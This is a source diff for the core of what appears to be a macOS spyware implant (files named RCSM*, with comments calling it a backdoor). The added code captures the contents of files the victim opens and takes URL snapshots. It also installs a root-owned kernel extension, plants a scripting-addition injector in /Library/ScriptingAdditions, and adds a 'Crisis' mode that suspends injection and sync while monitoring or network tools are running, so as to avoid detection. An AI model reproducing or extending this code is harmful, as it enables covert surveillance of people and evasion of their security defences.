@@ -33,6 +33,8 @@
 #import "RCSMCore.h"
 #import "RCSMCommon.h"
 
+#import "RCSMInfoManager.h"
+#import "RCSMFileSystemManager.h"
 #import "RCSMEncryption.h"
 #import "RCSMLogManager.h"
 #import "RCSMTaskManager.h"
@@ -44,8 +46,6 @@
 #import "NSApplication+SystemVersion.h"
 
 #define ICON_FILENAME  @"q45tyh"
-
-//#define DEBUG_CORE
 
 //
 // Old notification system
@@ -180,18 +180,6 @@ static void computerWillShutdown(CFMachPortRef port,
 @interface RCSMCore (hidden)
 
 - (void)_renameBackdoorAndRelaunch;
-
-#if 0
-//
-// Create the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_createAdvisoryLock: (NSString *)lockFile;
-
-//
-// Remove the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_removeAdvisoryLock: (NSString *)lockFile;
-#endif
 
 //
 // Renames entries in /var/log/system.log which contains our backdoor name
@@ -677,7 +665,10 @@ static void computerWillShutdown(CFMachPortRef port,
       
       readData = [gSharedMemoryLogging readMemoryFromComponent: COMP_CORE
                                                       forAgent: 0
-                                               withCommandType: CM_LOG_DATA | CM_CLOSE_LOG_WITH_HEADER ];
+                                               withCommandType: CM_CREATE_LOG_HEADER
+                                                                | CM_LOG_DATA
+                                                                | CM_CLOSE_LOG
+                                                                | CM_CLOSE_LOG_WITH_HEADER];
       
       if (readData != nil)
         {
@@ -758,12 +749,33 @@ static void computerWillShutdown(CFMachPortRef port,
                                       + _mouseHeader->processNameLength
                                       + _mouseHeader->windowNameLength;
                 
-                NSMutableData *mouseAdditionalHeader = [[NSMutableData alloc] initWithData:
-                                                        [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
-                
-                NSMutableData *mouseData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
-                                                                         NSMakeRange([mouseAdditionalHeader length],
-                                                                                     [logData length] - [mouseAdditionalHeader length])]];
+                NSMutableData *mouseAdditionalHeader = nil;
+                NSMutableData *mouseData = nil;
+
+                @try
+                  {
+                    mouseAdditionalHeader = [[NSMutableData alloc] initWithData:
+                                             [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
+                  
+                    mouseData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
+                                                                      NSMakeRange([mouseAdditionalHeader length],
+                                                                                  [logData length] - [mouseAdditionalHeader length])]];
+#ifdef DEBUG_CORE
+                    infoLog(@"additional size: %d", additionalSize);
+                    infoLog(@"mouseadd header len: %d", [mouseAdditionalHeader length]);
+                    infoLog(@"logData len: %d", [logData length]);
+#endif
+                  }
+                @catch (NSException *e)
+                  {
+#ifdef DEBUG_CORE
+                    errorLog(@"exception on mouse header makerange (%@)", [e reason]);
+#endif
+                    [mouseAdditionalHeader release];
+                    [mouseData release];
+                    continue;
+                  }
+
                 //
                 // Create log here since we need to pass anAgentHeader as the
                 // additional file header
@@ -1193,6 +1205,150 @@ static void computerWillShutdown(CFMachPortRef port,
             
                 break;
               }
+            case AGENT_INTERNAL_FILEOPEN:
+              {
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+
+                if ([_logManager writeDataToLog: logData
+                                       forAgent: AGENT_FILECAPTURE_OPEN
+                                      withLogID: 0] == TRUE)
+                  {
+#ifdef DEBUG_CORE
+                    infoLog(@"Logged file open");
+#endif
+                  }
+            
+                break;
+              }
+            case AGENT_INTERNAL_FILECAPTURE:
+              {
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+
+                NSString *path = [[NSString alloc] initWithData: logData
+                                                       encoding: NSUTF16LittleEndianStringEncoding];
+
+                RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+                BOOL success = [fsManager logFileAtPath: path
+                                             forAgentID: AGENT_FILECAPTURE];
+
+                if (!success)
+                  {
+#ifdef DEBUG_CORE
+                    errorLog(@"Error while logging file content at path %@", path);
+#endif
+                  }
+                else
+                  {
+#ifdef DEBUG_CORE
+                    infoLog(@"File content logged correctly for path %@", path);
+#endif
+                  }
+
+                [path release];
+                [fsManager release];
+                break;
+              }
+            case LOG_URL_SNAPSHOT:
+              {
+#ifdef DEBUG_CORE
+                verboseLog(@"Logs from url snapshot");
+#endif
+
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+                urlSnapAdditionalStruct *_urlHeader = (urlSnapAdditionalStruct *)[logData bytes];
+
+                switch (shMemLog->commandType)
+                  {
+                  case CM_CREATE_LOG_HEADER:
+                    {
+#ifdef DEBUG_CORE
+                      infoLog(@"Creating log header for url snapshot (%d)", shMemLog->flag);
+#endif
+                      int additionalSize = sizeof(urlSnapAdditionalStruct)
+                                           + _urlHeader->urlNameLen
+                                           + _urlHeader->windowTitleLen;
+
+                      NSMutableData *urlSnapAdditionalHeader = [[NSMutableData alloc] initWithData:
+                                                                         [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
+                      NSMutableData *urlSnapData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
+                        NSMakeRange([urlSnapAdditionalHeader length],
+                                    [logData length] - [urlSnapAdditionalHeader length])]];
+
+                      //
+                      // Create log here since we need to pass anAgentHeader as the
+                      // additional file header
+                      //
+                      if ([_logManager createLog: LOG_URL_SNAPSHOT
+                                     agentHeader: urlSnapAdditionalHeader
+                                       withLogID: shMemLog->flag] == TRUE)
+                        {
+                          if ([_logManager writeDataToLog: urlSnapData
+                                                 forAgent: LOG_URL_SNAPSHOT
+                                                withLogID: shMemLog->flag] == TRUE)
+                            {
+#ifdef DEBUG_CORE
+                              infoLog(@"Written first entry for URL snapshot (%d)", shMemLog->flag);
+#endif
+                            }
+                          else
+                            {
+#ifdef DEBUG_CORE
+                              errorLog(@"Error while writing first entry for URL snapshot");
+#endif
+                            }
+                        }
+                      else
+                        {
+#ifdef DEBUG_CORE
+                          errorLog(@"Error while creating URL snapshot log");
+#endif
+                        }
+
+                      [urlSnapAdditionalHeader release];
+                      [urlSnapData release];
+                    } break;
+                  case CM_LOG_DATA:
+                    {
+#ifdef DEBUG_CORE
+                      verboseLog(@"Received data for URL Snapshot");
+#endif
+                      if ([_logManager writeDataToLog: logData
+                                             forAgent: LOG_URL_SNAPSHOT
+                                            withLogID: shMemLog->flag] == TRUE)
+                        {
+#ifdef DEBUG_CORE
+                          verboseLog(@"Written data for URL snapshot");
+#endif
+                        }
+                      else
+                        {
+#ifdef DEBUG_CORE
+                          errorLog(@"Error while writing data for URL Snapshot (%d)", shMemLog->flag);
+#endif
+                        }
+                    } break;
+                  case CM_CLOSE_LOG:
+                    {
+#ifdef DEBUG_CORE
+                      infoLog(@"Closing log for url snapshot (%d)", shMemLog->flag);
+#endif
+
+                      [_logManager closeActiveLog: LOG_URL_SNAPSHOT
+                                        withLogID: shMemLog->flag];
+                    } break;
+                  default:
+                    {
+#ifdef DEBUG_CORE
+                      errorLog(@"Unknown command type from url snapshot");
+#endif
+                    }
+                  }
+
+                break;
+              }
             default:
               {
 #ifdef DEBUG_CORE
@@ -1249,7 +1405,7 @@ static void computerWillShutdown(CFMachPortRef port,
               if (x == 0)
                 warnLog(@"Skype is not running");
 #endif
-              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.1]];
+              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.01]];
             }
           
           [agentConfiguration release];
@@ -1456,13 +1612,13 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
-  
+
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           gKextName,
                           @"/Contents/MacOS",
                           gKextName];
-  
+
   NSString *tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            gKextName];
@@ -1470,14 +1626,26 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(@"tempKextDir: %@", tempKextDir);
   infoLog(@"backdoorContentPath: %@", _backdoorContentPath);
 #endif
-  
+
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
                                           toPath: _backdoorContentPath
                                            error: nil];
-  
+
   [tempKextDir release];
   [taskOutput release];
-  
+
+  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                       [[NSBundle mainBundle] bundlePath],
+                       gKextName];
+  NSArray *arguments = [NSArray arrayWithObjects:
+                        @"-R",
+                        @"root:wheel",
+                        _backdoorContentPath,
+                        nil];
+  [gUtil executeTask: @"/usr/sbin/chown"
+       withArguments: arguments
+        waitUntilEnd: YES];
+
   //
   // Backdoor .app Info.plist
   //
@@ -1964,7 +2132,7 @@ static void computerWillShutdown(CFMachPortRef port,
                        gInputManagerName];
 
 #ifdef DEBUG_CORE
-  warnLog(@"destination osax %@", destDir);
+  infoLog(@"destination osax %@", destDir);
 #endif
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -1974,9 +2142,19 @@ static void computerWillShutdown(CFMachPortRef port,
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
     {
+#ifdef DEBUG_CORE
+      infoLog(@"copying inputmanager file from %@", tempIMDir);
+#endif
       [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
                                               toPath: destDir
                                                error: nil];
+#ifdef DEBUG_CORE
+      if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
+                                               isDirectory: NO] == NO)
+        infoLog(@"OSAX file not created");
+      else
+        infoLog(@"OSAX file created correctly");
+#endif
     }
   
   [tempIMDir release];
@@ -1985,14 +2163,14 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
   
 #ifdef DEBUG_CORE
-  verboseLog(@"Original info.plist for osax %@", info_orig_pl);
+  infoLog(@"Original info.plist for osax %@", info_orig_pl);
 #endif
   
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
   
 #ifdef DEBUG_CORE
-  verboseLog(@"info.plist for osax %@", info_pl);
+  infoLog(@"info.plist for osax %@", info_pl);
 #endif
   
   [info_pl writeToFile: @"/Library/ScriptingAdditions/appleOsax/Contents/Info.plist" 
@@ -2635,7 +2813,7 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
-  
+
   if (getuid() != 0 && geteuid() == 0)
     {
       if ([self connectKext] == -1)
@@ -2643,13 +2821,13 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
           warnLog(@"connectKext failed, trying to load the KEXT");
 #endif
-          
+
           if ([gUtil loadKext] == YES)
             {
 #ifdef DEBUG_CORE
               infoLog(@"KEXT loaded successfully");
 #endif
-              
+
               if ([self connectKext] != -1)
                 {
                   kextLoaded = 1;
@@ -2668,6 +2846,7 @@ static void computerWillShutdown(CFMachPortRef port,
         }
     }
   
+
   if (kextLoaded == 1)
     {
 #ifdef DEBUG_CORE
@@ -2717,13 +2896,13 @@ static void computerWillShutdown(CFMachPortRef port,
       else if (gOSMajor == 10 && gOSMinor == 6)
         {
 #ifdef DEBUG_CORE
-          infoLog(@"Hiding OSAX");
+          //infoLog(@"Hiding OSAX");
 #endif
-          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
-          // Hiding input manager dir
-          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
-          
-          [osaxPath release];
+//          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
+//          // Hiding input manager dir
+//          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
+//          
+//          [osaxPath release];
         }
     
       NSString *appPath = [[[NSBundle mainBundle] bundlePath]
@@ -2785,6 +2964,12 @@ static void computerWillShutdown(CFMachPortRef port,
                                                              name: NSWorkspaceDidLaunchApplicationNotification 
                                                            object: nil];
   
+  // Register notification for terminate process for Crisis agent
+  [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
+                                                         selector: @selector(willStopCrisis:)
+                                                             name: NSWorkspaceDidTerminateApplicationNotification 
+                                                           object: nil];
+  
   //
   // Get a task Manager instance (singleton) and load the configuration
   // through the confManager
@@ -2806,6 +2991,10 @@ static void computerWillShutdown(CFMachPortRef port,
   [gControlFlagLock lock];
   taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
   [gControlFlagLock unlock];
+
+  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  [infoManager logActionWithDescription: @"Start"];
+  [infoManager release];
   
   //
   // Check /var/log/system.log
@@ -2918,15 +3107,86 @@ static void computerWillShutdown(CFMachPortRef port,
   [pool release];
 }
 
+- (BOOL)isCrisisHookApp: (NSString*)appName
+{
+  if (gAgentCrisisApp == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisApp count]; i++) 
+  {
+    NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
+}
+
+- (BOOL)isCrisisNetApp: (NSString*)appName
+{
+  if (gAgentCrisisNet == nil)
+    return NO;
+  
+  for (int i=0; i<[gAgentCrisisNet count]; i++) 
+  {
+    NSString *tmpAppName = [gAgentCrisisNet objectAtIndex: i];
+    if ([appName isCaseInsensitiveLike: tmpAppName])
+      return YES;
+  }
+  
+  return NO;
+}
+
+- (void)willStopCrisis: (NSNotification*)notification
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSDictionary *appInfo = [notification userInfo];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
+#endif
+  
+  if ((gAgentCrisis & CRISIS_SYNC) &&
+      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
+  {
+
+    gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
+#ifdef DEBUG_CORE
+    infoLog(@"Sync enabled! gAgentCrisis = 0x%x", gAgentCrisis);
+#endif
+  }
+    
+  [pool release];
+}
+
 - (void)injectBundle: (NSNotification*)notification
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   NSDictionary *appInfo = [notification userInfo];
 
 #ifdef DEBUG_CORE
-  verboseLog(@"running new notificaion on app %@", appInfo);
+  infoLog(@"running new notificaion on app %@", appInfo);
 #endif
-
+  
+  if ((gAgentCrisis & CRISIS_START) && 
+      [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
+  {
+    gAgentCrisis |= CRISIS_SYNC;
+#ifdef DEBUG_CORE
+    infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
+#endif
+  }
+  
+  if ((gAgentCrisis & CRISIS_START) && 
+      [self isCrisisHookApp: [appInfo objectForKey: @"NSApplicationName"]])
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"NSApplicationName match! skipping injection! CRISIS_SYNC = 0x%x", gAgentCrisis);
+#endif
+    return;
+  }
+  
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
     {
       // temporary thread for fixing euid/uid escalation
@@ -2998,7 +3258,7 @@ static void computerWillShutdown(CFMachPortRef port,
 - (int)connectKext
 {
 #ifdef DEBUG_CORE
-  infoLog(@"[connectKext] Initializing backdoor with kext");
+  infoLog(@"Initializing backdoor with kext");
 #endif
   
   gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
@@ -3012,8 +3272,8 @@ static void computerWillShutdown(CFMachPortRef port,
       if (ret < 0)
         {
 #ifdef DEBUG_CORE
-          errorLog(@"[connectKext] Error while initializing the uspace-kspace "\
-                        "communication channel");
+          errorLog(@"Error while initializing the uspace-kspace "\
+                     "communication channel");
 #endif
           
           return -1;
@@ -3021,14 +3281,14 @@ static void computerWillShutdown(CFMachPortRef port,
       else
         {
 #ifdef DEBUG_CORE
-          infoLog(@"[connectKext] Backdoor initialized correctly");
+          infoLog(@"Backdoor initialized correctly");
 #endif
         }
     }
   else
     {
 #ifdef DEBUG_CORE
-      errorLog(@"[connectKext] Error while opening the KEXT dev entry!");
+      errorLog(@"Error while opening the KEXT dev entry!");
 #endif
       
       return -1;
